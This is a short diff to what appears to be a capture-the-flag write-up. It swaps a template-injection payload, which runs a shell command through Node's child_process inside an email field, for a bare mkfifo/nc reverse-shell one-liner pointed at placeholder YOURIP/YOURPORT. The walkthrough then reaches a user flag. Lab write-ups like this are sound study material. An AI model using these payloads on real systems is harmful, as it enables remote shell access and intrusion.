@@ -101,9 +101,7 @@ Since we know this breakout works on this site we can now execute whatever we wa
 We startup our classic nc listener and find a reverse shell script to insert:
 
 ```
-{
-  "email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f')\")()}}@mail.com"
-}
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f
 ```
 
 We catch this shell, navigate to `/home/david` and see the `user.txt` right there:
